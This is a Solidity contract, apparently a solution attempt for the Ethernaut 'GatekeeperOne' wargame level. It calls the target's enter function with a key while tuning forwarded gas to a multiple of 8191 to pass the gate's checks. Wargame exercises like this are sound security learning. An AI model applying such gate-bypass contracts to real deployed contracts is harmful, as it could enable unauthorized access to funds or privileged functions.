// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

interface GatekeeperOne{
    function enter(bytes8) external returns (bool);
}

contract Hak {


  using SafeMath for uint256;
  address public owner;
  address hisAddr = 0xdBc7c99fE6B538631473060E8C2FBA627611d635;

  GatekeeperOne gone = GatekeeperOne(hisAddr);


    function getGasLeft()public view returns(uint) {
        return gasleft();
    }

        function makeModu(uint  _kk) public view returns(bool){
        return ( _kk.sub(_kk.mod(8191))==0);
    }

    function enter(bytes8 _jma)public returns(uint){
     // hisAddr.call(abi.encodeWithSignature("enter(bytes8)", _jma));
      gone.enter(_jma);
        return (gasleft());
    }
    function call(bytes8 _jma)public returns(uint){
      hisAddr.call{gas: gasleft().sub(gasleft().mod(8191))}(abi.encodeWithSignature("enter(bytes8)", _jma));
      //gone.enter(_jma);
        return (gasleft());
    }
  receive() external payable{}
  fallback() external payable{}


}

